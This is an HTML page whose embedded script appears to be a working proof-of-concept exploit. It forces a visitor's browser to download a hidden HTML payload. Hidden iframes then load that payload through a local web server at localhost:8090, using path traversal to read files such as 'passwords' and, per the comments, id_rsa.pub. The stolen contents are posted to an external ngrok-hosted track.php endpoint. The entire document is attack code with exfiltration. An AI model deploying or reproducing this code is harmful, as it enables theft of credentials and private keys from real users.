<body>
<img src="./image/image.jpg">
<script>
    // We guess that the workspace of a victim in at maximum 10 levels
    // deeper than the target home folder.
    const maxNesting = 10;

    ///////////////////////////////////////////////////////////////////////////
    // The payload of the file which a victim will download.
    const payload = `
<body>
<script>
for (let n = 0; n < ${maxNesting}; n++) {
    fetch('http://localhost:8090/foo/?/' + '../'.repeat(n) + 'passwords')
        .then((res) => {
            if (res.status === 200) {
                res.text().then((data) => window.parent.postMessage(data, '*'));
            }
        });
}
</scr` + 'ipt></body>';
    ///////////////////////////////////////////////////////////////////////////

    ///////////////////////////////////////////////////////////////////////////
    // This part should enforce victim's browser to download the payload as
    // an HTML file.
    const fileName = `file_${Math.random()}.html`;
    const a = document.createElement('a');

    a.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(payload));
    a.setAttribute('download', fileName);
    a.style.display = 'none';

    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    ///////////////////////////////////////////////////////////////////////////

    // After short delay we open bunch of iframes trying to load the file
    // a victim just downloaded.
    setTimeout(() => {
        for (let n = 0; n < maxNesting; n++) {
            const iframe = document.createElement('iframe');

            iframe.setAttribute('src', `http://localhost:8090/foo/?/${'../'.repeat(n)}Downloads/${fileName}`);
            iframe.setAttribute('style', 'width: 0px; height: 0px;')

            document.body.appendChild(iframe);
        }
    }, 500);

    // In this handler we receive a message from one of the iframes.
    // The message should contain id_rsa.pub file. We send it to
    // our track.php script to save.
    window.addEventListener('message', (event) => {
        const formData = new FormData();

        formData.append('data', event.data);

        fetch('http://yourdomain.ngrok.io/track.php', {
            body: formData,
            method: 'post'
        });
    }, false);
</script>
</body>

